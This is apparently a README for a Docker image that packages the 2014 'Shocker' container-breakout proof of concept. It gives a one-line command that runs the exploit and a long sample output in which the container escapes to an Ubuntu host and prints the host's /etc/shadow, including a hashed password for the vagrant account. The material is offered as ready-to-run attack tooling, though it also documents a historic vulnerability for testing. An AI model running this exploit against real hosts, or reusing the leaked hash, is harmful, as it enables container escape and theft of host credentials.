# Shocker / Docker Breakout PoC

This is a Docker Image used to test container breakout exploit first posted here:
http://stealth.openwall.net/xSports/shocker.c

The container will attempt to find and print contents of the Docker host's /etc/shadow.

## Usage

To run the PoC exploit use:

    docker run gabrtv/shocker

## Building

To modify source and rebuild, use:

    docker build -t gabrtv/shocker .

## Examples

Ubuntu 12.04 LTS host running Docker 0.10

```
root@precise64:~# docker run gabrtv/shocker
Unable to find image 'gabrtv/shocker' locally
Pulling repository gabrtv/shocker
43a03e74839f: Download complete 
511136ea3c5a: Download complete 
e465fff03bce: Download complete 
23f361102fae: Download complete 
9db365ecbcbb: Download complete 
ad892dd21d60: Download complete 
c242002775ee: Download complete 
a89c95ad2c32: Download complete 
2c98114bb5ba: Download complete 
2efa77e11c03: Download complete 
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'etc/shadow'
[*] Found vmlinuz
[*] Found vagrant
[*] Found lib64
[*] Found usr
[*] Found .
[*] Found run
[*] Found mnt
[*] Found lost+found
[*] Found srv
[*] Found var
[*] Found lib
[*] Found sbin
[*] Found root
[*] Found dev
[*] Found proc
[*] Found sys
[*] Found media
[*] Found selinux
[*] Found bin
[*] Found opt
[*] Found ..
[*] Found etc
[+] Match: etc ino=3932161
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0x00, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'shadow'
[*] Found timezone
[*] Found cron.hourly
[*] Found grub.d
[*] Found debian_version
[*] Found mtab
[*] Found sudoers.d
[*] Found kernel
[*] Found xml
[*] Found hostname
[*] Found vim
[*] Found terminfo
[*] Found nanorc
[*] Found gssapi_mech.conf
[*] Found services
[*] Found rc2.d
[*] Found resolv.conf
[*] Found security
[*] Found wgetrc
[*] Found magic
[*] Found lsb-release
[*] Found pam.conf
[*] Found cron.weekly
[*] Found hdparm.conf
[*] Found calendar
[*] Found environment
[*] Found rpc
[*] Found issue
[*] Found .
[*] Found groff
[*] Found crontab
[*] Found shells
[*] Found updatedb.conf
[*] Found locale.alias
[*] Found sudoers
[*] Found rc4.d
[*] Found rc3.d
[*] Found X11
[*] Found rcS.d
[*] Found gshadow-
[*] Found insserv.conf.d
[*] Found sgml
[*] Found rmt
[*] Found init.d
[*] Found group
[*] Found resolvconf
[*] Found rc5.d
[*] Found group-
[*] Found fonts
[*] Found popularity-contest.conf
[*] Found rc6.d
[*] Found ucf.conf
[*] Found vagrant_box_build_time
[*] Found mailcap.order
[*] Found default
[*] Found netconfig
[*] Found update-motd.d
[*] Found newt
[*] Found bash.bashrc
[*] Found ntp.conf
[*] Found adduser.conf
[*] Found initramfs-tools
[*] Found bash_completion.d
[*] Found ca-certificates.conf
[*] Found iscsi
[*] Found libnl-3
[*] Found motd.tail
[*] Found lsb-base-logging.sh
[*] Found ssh
[*] Found securetty
[*] Found ld.so.cache
[*] Found modprobe.d
[*] Found skel
[*] Found shadow
[+] Match: shadow ino=3935729
[*] Brute forcing remaining 32bit. This can take a while...
[*] (shadow) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0xf1, 0x0d, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0xf1, 0x0d, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:
root:!:15597:0:99999:7:::
daemon:*:15597:0:99999:7:::
bin:*:15597:0:99999:7:::
sys:*:15597:0:99999:7:::
sync:*:15597:0:99999:7:::
games:*:15597:0:99999:7:::
man:*:15597:0:99999:7:::
lp:*:15597:0:99999:7:::
mail:*:15597:0:99999:7:::
news:*:15597:0:99999:7:::
uucp:*:15597:0:99999:7:::
proxy:*:15597:0:99999:7:::
www-data:*:15597:0:99999:7:::
backup:*:15597:0:99999:7:::
list:*:15597:0:99999:7:::
irc:*:15597:0:99999:7:::
gnats:*:15597:0:99999:7:::
nobody:*:15597:0:99999:7:::
libuuid:!:15597:0:99999:7:::
syslog:*:15597:0:99999:7:::
messagebus:*:15597:0:99999:7:::
ntp:*:15597:0:99999:7:::
sshd:*:15597:0:99999:7:::
vagrant:$6$aqzOtgCM$OxgoMP4JoqMJ1U1F3MZPo2iBefDRnRCXSfgIM36E5cfMNcE7GcNtH1P/tTC2QY3sX3BxxJ7r/9ciScIVTa55l0:15597:0:99999:7:::
vboxadd:!:15597::::::
statd:*:15597:0:99999:7:::
```

:( 

## License

BSD
